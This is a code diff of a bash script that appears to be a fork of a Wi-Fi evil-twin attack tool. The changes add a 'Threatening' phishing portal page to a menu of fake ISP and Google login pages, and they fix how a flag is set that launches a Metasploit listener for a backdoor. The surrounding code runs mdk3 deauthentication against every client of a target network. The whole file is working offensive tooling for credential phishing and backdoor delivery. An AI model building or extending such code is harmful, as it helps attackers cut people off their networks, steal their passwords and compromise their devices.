@@ -1369,18 +1369,22 @@ function ConnectionRESET {
                         read webconf
 
                         if [ "$webconf" = "1" ]; then
+				Metasp_configure="off"
         			phisingWIFIpages
         			break
 
 			elif [ "$webconf" = "2" ]; then
+				Metasp_configure="off"
         			trolling
         			break
 
 			elif [ "$webconf" = "3" ]; then
+				Metasp_configure="off"
         			love
         			break
 
 			elif [ "$webconf" = "4" ]; then
+				Metasp_configure="on"
         			metasploit
         			break
 
@@ -1656,7 +1660,7 @@ function attack {
         killall mdk3 &> $flux_output_device
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
         xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-	if [ "$Metasp_configure"="on" ]; then
+	if [ $Metasp_configure = "on" ]; then
 	cd $path_metasploit
         xterm -geometry 100x25+250+150 -fa monaco -fs 12 -bg black -title "Metasploit Listerning" -e msfconsole -r script-listerning.rc &
 	fi
@@ -2135,6 +2139,10 @@ function phisingWIFIpages {
 			mkdir $DUMP_PATH/data &>$flux_output_device
 		    	cp -r  $WORK_DIR/sites/vnpt/* $DUMP_PATH/data
 			}
+		function threatening {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+		    	cp -r  $WORK_DIR/sites/threatening/* $DUMP_PATH/data
+			}
         if [ "$FLUX_AUTO" = "1" ];then
                 webconf=1
         else
@@ -2193,6 +2201,7 @@ function phisingWIFIpages {
                         echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Google";n=` expr $n + 1`
       	    		echo -e "      "$red"["$yellow"$n"$red"]"$transparent" MOVISTAR    [ESP]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" VNPT        [VN]";n=`expr $n + 1`
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Threatening [EN]";n=`expr $n + 1`
                         echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
                         echo
                         echo -n "#? "
@@ -2632,7 +2641,10 @@ function phisingWIFIpages {
 			elif [ "$webconf" = "46" ]; then
         			VNPT
         			break
-                        elif [ "$webconf" = "47" ]; then
+			elif [ "$webconf" = "47" ]; then
+        			threatening
+        			break
+                        elif [ "$webconf" = "48" ]; then
                                 conditional_clear
                                 webinterface
                                 break
@@ -2734,7 +2746,6 @@ function love {
 fi
 }
 function metasploit {
-	Metasp_configure="on"
 	echo -ne " ${red}=>${white} Enter the location folder of backdoor : ${transparent}"
 	read folder
 	folder_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
